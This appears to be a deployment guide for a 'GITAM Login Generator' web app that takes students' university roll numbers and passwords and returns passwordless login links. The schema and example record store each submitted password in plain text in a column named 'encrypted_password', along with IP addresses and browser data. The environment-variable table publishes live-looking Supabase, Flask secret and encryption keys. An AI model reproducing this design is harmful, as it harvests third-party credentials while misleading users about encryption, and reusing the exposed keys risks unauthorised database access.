# 🚀 Deployment Guide

Complete guide to deploy GITAM Login Generator to Render.com with Supabase integration.

---

## 📋 Prerequisites

- GitHub account
- Render.com account (free tier available)
- Supabase project ID: `ntoewmrrwcinjvrwkgpu`

---

## Part 1: Database Setup (One-Time)

### Step 1: Setup Supabase Table

1. Go to: https://app.supabase.com/project/ntoewmrrwcinjvrwkgpu/sql
2. Open the file: `supabase_schema.sql` in this repository
3. Copy ALL the SQL code
4. Paste it into Supabase SQL Editor
5. Click **Run**
6. Verify `login_records` table is created

**Table Structure:**
```
login_records
├── id              → Auto-increment primary key
├── roll_number     → Student roll number
├── encrypted_password → Plain password storage
├── uid_url         → Generated login link
├── ip_address      → Client IP
├── user_agent      → Browser info
├── created_at      → Record creation time
└── last_accessed   → Last access time
```

---

## Part 2: GitHub Setup

### Step 2: Push to GitHub

```bash
cd /Users/jagadeeshpotupureddy/Downloads/vscode/pyfiles/webapp

# Initialize git
git init

# Add all files
git add .

# First commit
git commit -m "first commit"

# Set main branch
git branch -M main

# Add remote
git remote add origin https://github.com/deadhearth01/glogin-nopass.git

# Push to GitHub
git push -u origin main
```

**Important:** The `.env` file will NOT be pushed (protected by `.gitignore`) ✅

---

## Part 3: Render Deployment

### Step 3: Create Web Service

1. Go to: https://dashboard.render.com/
2. Click **New +** → **Web Service**
3. Connect your GitHub account (if not already)
4. Select repository: `deadhearth01/glogin-nopass`
5. Click **Connect**

### Step 4: Configure Service

**Basic Settings:**
- **Name:** `gitam-login-generator` (or any name you prefer)
- **Region:** Oregon (US West) or closest to you
- **Branch:** `main`
- **Root Directory:** Leave blank (or `./`)
- **Runtime:** `Python 3`
- **Build Command:** `pip install -r requirements.txt`
- **Start Command:** `gunicorn app:app`
- **Publish Directory:** Leave blank (not needed for Flask backend)

**Instance Type:**
- **Free** - Good for testing (spins down after 15 min inactivity)
- **Starter ($7/month)** - Recommended for production (always on)

### Step 5: Add Environment Variables

Click **Advanced** → **Add Environment Variable**

Add these variables ONE BY ONE:

| Key | Value |
|-----|-------|
| `SUPABASE_URL` | `https://ntoewmrrwcinjvrwkgpu.supabase.co` |
| `SUPABASE_ANON_KEY` | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im50b2V3bXJyd2Npbmp2cndrZ3B1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkwNzM4MTgsImV4cCI6MjA3NDY0OTgxOH0.pY1280bWzvBqvwNaZV-jMP7n84Sr0qtCPQXMI-qbVB8` |
| `SECRET_KEY` | `4ca01deadfa576f8968e2fc41ff59018c5cf4173a7cdd453c8d1bc36139a19f1` |
| `ENCRYPTION_KEY` | `TU4ye6CPOtlCE1URkePijI0z0vkv69A8m9f-JrYhNgs=` |
| `FLASK_ENV` | `production` |

### Step 6: Deploy

1. Click **Create Web Service**
2. Render will start building (3-5 minutes)
3. Watch the logs for progress

**Look for:**
- ✅ Installing dependencies
- ✅ Building application
- ✅ Starting gunicorn
- ✅ Application running

---

## Part 4: Testing

### Step 7: Access Your Application

Once deployed, you'll get a URL like:
```
https://gitam-login-generator.onrender.com
```

### Step 8: Test the Application

1. Open your Render URL
2. Enter valid GITAM credentials
3. Click "Get No-Pass Link"
4. Verify you receive the encrypted ID and login link

### Step 9: Verify Database

1. Go to Supabase Dashboard
2. Navigate to: Table Editor → `login_records`
3. Check for new record with:
   - Roll number ✓
   - Plain password ✓
   - UID URL ✓
   - IP address ✓
   - User agent ✓
   - Timestamps ✓

---

## 📊 What Gets Stored

**Example Record in Supabase:**
```json
{
  "id": 1,
  "roll_number": "Vu22csen0100009",
  "encrypted_password": "YourPassword123",
  "uid_url": "https://gstudent.gitam.edu/Login/?id=Lk7qcNlxCsHD3Et...",
  "ip_address": "203.192.xxx.xxx",
  "user_agent": "Mozilla/5.0...",
  "created_at": "2025-10-18T12:30:13Z",
  "last_accessed": "2025-10-18T12:30:13Z"
}
```

---

## 🔄 Updating Your Application

After making code changes:

```bash
git add .
git commit -m "Update: description of changes"
git push
```

Render will automatically detect the push and redeploy! 🎉

---

## 🐛 Troubleshooting

### Build Failed
- Check logs in Render dashboard
- Verify `requirements.txt` exists
- Check Python version in `runtime.txt`

### Application Crashes
- Verify environment variables are set correctly
- Check Supabase credentials
- View logs: Dashboard → Your Service → Logs

### Database Not Saving
- Verify `login_records` table exists in Supabase
- Check environment variables (SUPABASE_URL, SUPABASE_ANON_KEY)
- Look for errors in Render logs

### Login Fails
- Verify GITAM credentials are correct
- Check logs for error messages
- Ensure internet connection is stable

---

## 💰 Costs

**Free Tier:**
- Render: Free (750 hours/month, spins down after inactivity)
- Supabase: Free (500MB database, 2GB bandwidth)
- **Total: $0/month**

**Production Tier:**
- Render Starter: $7/month (always on, better performance)
- Supabase: Free (sufficient for most use cases)
- **Total: $7/month**

---

## ✅ Deployment Checklist

- [ ] Run Supabase schema SQL
- [ ] Push code to GitHub
- [ ] Create Render web service
- [ ] Add all environment variables
- [ ] Deploy and wait for build
- [ ] Test with real GITAM credentials
- [ ] Verify data in Supabase
- [ ] Share production URL

---

## 🔒 Security Notes

⚠️ **Important:**
1. Never commit `.env` to Git (already protected ✅)
2. Keep Supabase credentials secure
3. Monitor access logs regularly
4. Use HTTPS only (Render provides free SSL)

---

## 📞 Need Help?

**Check:**
- Render logs (Dashboard → Your Service → Logs)
- Supabase logs (Dashboard → Logs)
- Environment variables are correct
- Database table exists

**Documentation:**
- Render: https://render.com/docs
- Supabase: https://supabase.com/docs

---

🎉 **You're ready to deploy!**
